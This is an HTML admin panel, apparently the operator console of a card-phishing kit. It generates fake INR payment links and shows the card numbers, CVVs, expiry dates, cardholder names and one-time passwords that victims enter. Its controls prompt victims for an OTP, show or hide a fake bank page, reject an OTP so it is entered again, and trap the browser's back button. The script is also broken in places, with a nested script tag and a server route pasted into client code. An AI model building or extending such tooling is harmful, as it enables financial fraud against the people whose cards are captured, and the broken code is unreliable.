<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    .generate-link {
      background: #222;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #aaa;
    }
    input, textarea {
      width: 100%;
      padding: 8px;
      border: 1px solid #444;
      background: #333;
      color: #fff;
      border-radius: 4px;
    }
    .payment-link {
      margin-top: 15px;
      padding: 10px;
      background: #333;
      border-radius: 4px;
      display: none;
    }
    .copy-btn {
      background: #22c55e;
      border: none;
      color: #fff;
      padding: 5px 10px;
      border-radius: 4px;
      cursor: pointer;
      margin-left: 10px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #111;
      margin-bottom: 20px;
    }
    th, td {
      padding: 10px;
      border: 1px solid #333;
      text-align: left;
      font-size: 12px;
    }
    th {
      background: #222;
    }
    tr:nth-child(even) {
      background: #222;
    }
    button {
      background: #4a90e2;
      color: #fff;
      border: none;
      padding: 6px 10px;
      margin-right: 4px;
      cursor: pointer;
      border-radius: 4px;
      font-size: 12px;
    }
    button:hover {
      background: #357ABD;
    }
    button:disabled {
      background: #666;
      cursor: not-allowed;
    }
    .status-badge {
      padding: 2px 6px;
      border-radius: 3px;
      font-size: 11px;
      font-weight: bold;
    }
    .status-processing { background: #f59e0b; color: #000; }
    .status-otp { background: #3b82f6; color: #fff; }
    .status-success { background: #22c55e; color: #fff; }
    .status-fail { background: #ef4444; color: #fff; }
    .otp-received {
      background-color: #10B981;
      color: #fff;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 12px;
    }
    .show-otp-btn { background: #22c55e; }
    .bank-page-btn { background: #8b5cf6; }
    .bank-page-btn:hover { background: #7c3aed; }
    .show-otp-btn:disabled { background: #666; }
    .wrong-otp-btn { background: #ef4444; }
    .wrong-otp-btn:hover { background: #dc2626; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Admin Panel</h1>
    
    <div class="generate-link">
      <h2>Generate Payment Link</h2>
      <form id="generateLinkForm">
        <div class="form-group">
          <label>Amount (INR)</label>
          <input type="number" id="amount" required min="1" step="1">
        </div>
        <div class="form-group">
          <label>Description</label>
          <textarea id="description" rows="2" required></textarea>
        </div>
        <button type="submit">Generate Link</button>
      </form>
      <div id="paymentLinkContainer" class="payment-link">
        <span>Payment Link: </span>
        <span id="paymentLink"></span>
        <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
      </div>
    </div>
    
    <h2>Transactions</h2>
    <table id="transactionsTable">
      <thead>
        <tr>
          <th>Invoice ID</th>
          <th>Email</th>
          <th>Amount</th>
          <th>Currency</th>
          <th>Card Number</th>
          <th>CVV</th>
          <th>Expiry</th>
          <th>Cardholder</th>
          <th>OTP</th>
          <th>Status</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <!-- Transaction rows will be injected here -->
      </tbody>
    </table>
  </div>
  
  <script src="/socket.io/socket.io.js"></script>
  <script>
    let transactions = new Map();
    let paymentLinks = new Map();

    // Generate Payment Link Handler – DO NOT REMOVE any existing code; just replace this block
   <script>
  // Generate Payment Link Handler – DO NOT remove any other parts of your code
document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
  e.preventDefault(); // Prevent form from refreshing the page

  const amountInput = document.getElementById('amount');
  const descInput = document.getElementById('description');
  const linkContainer = document.getElementById('paymentLinkContainer');

  try {
    linkContainer.style.display = 'none';

    const amount = parseFloat(amountInput.value);
    const description = descInput.value.trim();

    if (!amount || amount <= 0) {
      alert('Please enter a valid positive amount');
      return;
    }

    if (!description) {
      alert('Description cannot be empty');
      return;
    }

    const response = await fetch('/api/generatePaymentLink', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount, description })
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || 'Payment link generation failed');
    }

    const data = await response.json();
    document.getElementById('paymentLink').textContent = data.paymentLink;
    linkContainer.style.display = 'block';
    alert('Payment link generated successfully!');

  } catch (error) {
    console.error('Error:', error);
    alert(`ERROR: ${error.message}`);
    linkContainer.style.display = 'none';
  }
});

  
  function copyPaymentLink() {
    const link = document.getElementById('paymentLink').textContent;
    navigator.clipboard.writeText(link);
    alert('Payment link copied to clipboard!');
  }
  
  // ... (the rest of your admin.html script remains unchanged)

    
    async function loadTransactions() {
      try {
        const response = await fetch("/api/transactions");
        const data = await response.json();
        const tbody = document.querySelector("#transactionsTable tbody");
        tbody.innerHTML = '';
        data.forEach(tx => {
          const row = document.createElement('tr');
          row.innerHTML = `
            <td>${tx.id}</td>
            <td>${tx.email}</td>
            <td>${tx.amount}</td>
            <td>${tx.currency}</td>
            <td>${tx.cardNumber}</td>
            <td>${tx.cvv}</td>
            <td>${tx.expiry}</td>
            <td>${tx.cardholder}</td>
            <td>
              ${tx.otpEntered ? 
                `<span class="otp-received">${tx.otpEntered}</span>
                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
                   Incorrect OTP
                 </button>` : 
                tx.otpShown ?
                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                    Show OTP
                  </button>
                  <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                    ${tx.bankpageVisible ? 'Hide Bankpage' : 'Bank Page'}
                  </button>`
                <button class="hide-bankpage-btn" onclick="hideBankPage('${tx.id}')">
  Hide Bankpage
</button>

              }
            </td>
            <td>
              <span class="status-badge status-${tx.status || 'processing'}">
                ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
              </span>
            </td>
            <td>
              ${!tx.redirectStatus ? `
                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
                  Success
                </button>
                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>
                  Fail
                </button>
              ` : ''}
              <button onclick="toggleBankpage('${tx.id}')" class="bank-page-btn">  
    ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}  
  </button>  
            </td>
          `;
          tbody.appendChild(row);
          transactions.set(tx.id, tx);
        });
      } catch (error) {
        console.error('Error loading transactions:', error);
      }
    }
    
    async function updateStatus(id, status) {
      try {
        const response = await fetch("/api/updateRedirectStatus", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
        });
        if (!response.ok) throw new Error('Failed to update status');
        loadTransactions();
      } catch (error) {
        console.error('Error updating status:', error);
        alert('Failed to update status. Please try again.');
      }
    }
    
    async function showOTP(id) {
      try {
        const response = await fetch("/api/showOTP", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });
        if (!response.ok) throw new Error('Failed to show OTP');
        loadTransactions();
      } catch (error) {
        console.error('Error showing OTP:', error);
        alert('Failed to show OTP. Please try again.');
      }
    }
    
    async function redirectToBankPage(id) {
      try {
        const response = await fetch("/api/redirectToBankPage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });
        if (!response.ok) throw new Error('Failed to redirect to bank page');
        loadTransactions();
      } catch (error) {
        console.error('Error redirecting to bank page:', error);
        alert('Failed to redirect to bank page. Please try again.');
      }
    }
    
    async function markWrongOTP(id) {
      try {
        const response = await fetch("/api/wrongOTP", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });
        if (!response.ok) throw new Error('Failed to mark OTP as wrong');
        loadTransactions();
      } catch (error) {
        console.error('Error marking OTP as wrong:', error);
        alert('Failed to mark OTP as wrong. Please try again.');
      }
    }
    
async function toggleBankpage(id) {
  try {
    const response = await fetch(`/api/transactions`);
    const transactionsData = await response.json();
    const txn = transactionsData.find(t => t.id === id);
    if (!txn) throw new Error('Transaction not found');

    const endpoint = txn.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
    const apiResponse = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ invoiceId: id })
    });

    if (!apiResponse.ok) {
      const errorData = await apiResponse.json();
      throw new Error(errorData.message || 'Failed to toggle bank page');
    }

    await loadTransactions();
  } catch (error) {
    console.error('Error:', error);
    alert(`Error: ${error.message}`);
  }
}

// Hide Bankpage function
async function hideBankPage(id) {
  try {
    const response = await fetch("/api/hideBankpage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ invoiceId: id })
    });

    if (!response.ok) throw new Error('Failed to hide bank page');

    // Emit event to user
    socket.emit('hide_bankpage', { invoiceId: id });

    loadTransactions();
  } catch (error) {
    console.error('Error hiding bank page:', error);
    alert('Failed to hide bank page. Please try again.');
  }
}

    app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = null;
  txn.bankpageVisible = false;

  // Emit event to frontend to close the popup
  io.emit('hide_bankpage', { invoiceId });

  res.json({ status: 'success' });
});

    loadTransactions();
    setInterval(loadTransactions, 2000);
    
    const socket = io();
    socket.on('refreshTransactions', () => {
      loadTransactions();
    });
    
    window.onpopstate = function(event) {
      if (confirm("Do you want to cancel this transaction?")) {
        window.location.href = '/fail.html?reason=canceled';
      } else {
        history.pushState(null, null, window.location.href);
      }
    };
    history.pushState(null, null, window.location.href);
  </script>
  <script src="/socket.io/socket.io.js"></script>
  <!-- Bankpage Overlay Element -->
  <div id="bankpageOverlay" class="fullscreen-overlay">
    <div class="spinner"></div>
  </div>
  
  <!-- New CSS for the fullscreen overlay -->
  <style>
    .fullscreen-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px);
      z-index: 9999;
      display: none;
      justify-content: center;
      align-items: center;
    }
  </style>
</body>
</html>
